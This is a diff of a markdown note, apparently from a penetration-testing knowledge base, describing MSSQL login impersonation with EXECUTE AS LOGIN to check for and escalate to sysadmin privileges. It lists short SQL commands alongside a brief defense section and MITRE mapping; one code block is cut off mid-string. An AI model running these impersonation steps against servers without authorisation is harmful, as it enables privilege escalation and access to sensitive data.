@@ -41,9 +41,13 @@ From a technical standpoint, the attacker would use a SQL Server query to impers
 
 The business value of this procedure is that it allows attackers to gain access to sensitive information and escalate privileges, potentially leading to a complete compromise of the targeted system.
 
+ 
+
 ## Requirements
 
 1. Valid login credentials for the MSSQL Server
+
+ 
 
 ## Defense
 
@@ -53,20 +57,32 @@ The business value of this procedure is that it allows attackers to gain access 
 
 1. Regularly review and update access control policies to ensure that only authorized users have access to sensitive information
 
+ 
+
 ## Objectives
 
 1. Obtain system user and login credentials
 
 1. Escalate privileges
 
+ 
+
 # Instructions
 
 1. This command is used to check the system user and login credentials. The command will return the current system user and whether the user is a member of the sysadmin server role. The command will then execute a login as the specified user 'adminuser' and return the system user and whether the user is a member of the sysadmin server role. Finally, the command will return the original login credentials.
 
+ 
+
+
+
 **Code**: [[SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadm]]
 
+
+
 > The first SELECT statement returns the current system user. The second SELECT statement returns whether the user is a member of the sysadmin server role. The EXECUTE AS statement executes subsequent commands as the specified user 'adminuser'. The third SELECT statement returns the system user after executing the login as 'adminuser'. The fourth SELECT statement returns whether the user is a member of the sysadmin server role after executing the login as 'adminuser'. The fifth SELECT statement returns the original login credentials.
+
+
 
 **Command** ([[Select System User]]):
 
@@ -74,11 +90,19 @@ SELECT IS_SRVROLEMEMBER('sysadm]]
 SELECT SYSTEM_USER
 ```
 
+
+
+
+
 **Command** ([[Select Is SRVROLEMEMBER]]):
 
 ```bash
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
+
+
+
+
 
 **Command** ([[Execute as Login]]):
 
@@ -86,11 +110,19 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 EXECUTE AS LOGIN = 'adminuser'
 ```
 
+
+
+
+
 **Command** ([[Select System User]]):
 
 ```bash
 SELECT SYSTEM_USER
 ```
+
+
+
+
 
 **Command** ([[Select Is SRVROLEMEMBER]]):
 
@@ -98,11 +130,17 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
+
+
+
+
 **Command** ([[Select Original Login]]):
 
 ```bash
 SELECT ORIGINAL_LOGIN()
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -130,3 +168,5 @@ SELECT ORIGINAL_LOGIN()
 - [[Exploiting Impersonation]]
 - [[Manual SQL Server Queries]]
 - [[MSSQL Server]]
+
+
